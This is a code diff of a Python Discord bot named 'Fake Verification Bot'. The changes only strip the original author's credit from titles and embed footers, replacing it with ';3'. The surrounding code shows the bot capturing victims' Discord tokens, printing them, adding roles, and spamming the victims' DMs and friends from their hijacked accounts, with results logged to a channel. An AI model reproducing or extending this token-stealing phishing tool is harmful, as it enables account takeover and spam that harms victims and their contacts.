@@ -44,7 +44,7 @@ message = config.get('message')
 #Bot title
 def bot_title():
     os.system("cls")
-    ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made by Astraa#6100")
+    ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot")
     print(f"""\n\n{Fore.RESET}                            ███████╗ █████╗ ██╗  ██╗███████╗    ██╗   ██╗███████╗██████╗ ██╗███████╗
                             ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██║   ██║██╔════╝██╔══██╗██║██╔════╝
                             █████╗  ███████║█████╔╝ █████╗      ██║   ██║█████╗  ██████╔╝██║█████╗  
@@ -84,7 +84,7 @@ def startprint():
 intents = nextcord.Intents.default()
 intents.message_content = True
 
-bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot - Made by Astraa#6100", intents=intents)
+bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot", intents=intents)
 
 #Launching the Bot
 def Init():
@@ -316,7 +316,7 @@ async def start(ctx):
 
                     print(f"{y}[{b}#{y}]{w} Token: {token}")
                     if logs_channel:
-                        embed_user.set_footer(text="Made by Astraa#6100  ・  https://github.com/astraadev")
+                        embed_user.set_footer(text=";3")
                         embed_user.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                         await logs_channel.send(embed=embed_user)
                     
@@ -327,7 +327,7 @@ async def start(ctx):
                             print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Role added to {user.username}#{user.discriminator}")
                             if logs_channel:
                                 embed_role = nextcord.Embed(title=f"**Add Role Option:**", description=f"```yaml\nRole {role_name} added to {user.username}#{user.discriminator} with success!```", color=5003474)
-                                embed_role.set_footer(text="Made by Astraa#6100  ・  https://github.com/astraadev")
+                                embed_role.set_footer(text=";3")
                                 embed_role.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                 await logs_channel.send(embed=embed_role)
                         except:
@@ -356,7 +356,7 @@ async def start(ctx):
                             print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Current DM(s) successfully messaged")
                             if logs_channel:
                                 embed_cdm = nextcord.Embed(title=f"**Spam Current DMs Option:**", description=f"Messages sent succesfully with {user.username}#{user.discriminator} account\n```yaml\nMessage: {message}\nCurrent Dms: {len(channel_id)}\nSuccessfully sent: {success} message(s)\nUnuccessfully sent: {failures} message(s)```", color=5003474)
-                                embed_cdm.set_footer(text="Made by Astraa#6100  ・  https://github.com/astraadev")
+                                embed_cdm.set_footer(text=";3")
                                 embed_cdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                 await logs_channel.send(embed=embed_cdm)
                         except Exception as e:
@@ -384,7 +384,7 @@ async def start(ctx):
                                 print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Friend(s) successfully messaged")
                             if logs_channel:
                                 embed_fdm = nextcord.Embed(title=f"**Spam Friends Option:**", description=f"Messages sent succesfully with {user.username}#{user.discriminator} account\n```yaml\nMessage: {message}\nTotal Friends: {len(getfriends)}```", color=5003474)
-                                embed_fdm.set_footer(text="Made by Astraa#6100  ・  https://github.com/astraadev")
+                                embed_fdm.set_footer(text=";3")
                                 embed_fdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                 await logs_channel.send(embed=embed_fdm)
                         except Exception as e:
